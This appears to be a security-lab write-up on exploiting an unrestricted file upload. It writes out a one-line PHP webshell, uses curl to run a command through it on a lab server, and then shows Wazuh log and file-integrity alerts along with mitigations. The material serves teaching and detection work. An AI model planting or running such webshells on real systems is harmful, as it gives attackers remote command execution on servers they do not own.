# 03 — Unrestricted Upload and Webshell

## Objective

Show how an unrestricted file upload can be used to place a server-side executable file in a web-accessible directory.

## Commands

After authenticating with the privileged account (`hacker`), prepare the test file and upload it through the application:

```bash
echo "<?php system($_REQUEST['cmd']); ?>" > malicious.php
```

![](/docs/images/upload-malicious.png)
## Execution and expected result

The vulnerable application accepts the file despite the misleading MIME type. If the upload directory is executable and web-accessible, the request returns the command output.


```bash
┌──(kali㉿kali)-[~]
└─$ curl -G "http://10.10.10.1/uploads/malicious.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(dev)

```

## Wazuh view

```json
{
  "ip": "10.10.20.10",
  "name": "reverse-proxy",
  "full_log": "10.10.10.10 - - [14/Oct/2026:22:19:51 +0000] \"POST /upload.php HTTP/1.1\" 500 171 \"http://10.10.10.1/admin/uploads\" \"Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0\"",
}
```
The Nginx log shows a 500 error because the Nginx reverse proxy cannot 
stream the response from the PHP process. However, the upload itself succeeded, 
as confirmed by the application log.
```json
{
  "ip": "192.168.1.2",
  "name": "ubuntu-server",
  "srcip": "10.10.10.10",
  "description": "Successful file upload: malicious.php (35 bytes) from 10.10.10.10",
}
```
I deployed a FIM (file integrity monitoring) which is a feature of Wazuh allowing me to check If a file was added/deleted/modified in the `/var/www/html/uploads` directory and as we can see here below:
```json
{
    "ip": "192.168.1.2",
    "name": "ubuntu-server",
    "description": "File added to the system.",
    "full_log": "File '/var/www/html/uploads/malicious.php' added\nMode: realtime\n",
    "timestamp": "2026-10-14T23:31:43.875+0000"
}
```
## Mitigation

- Allow only required file extensions and validate the actual file type.
- Generate server-side filenames and reject executable extensions.
- Store uploads outside the web root.
- Disable script execution in the upload directory.
- Monitor upload directories with Wazuh FIM.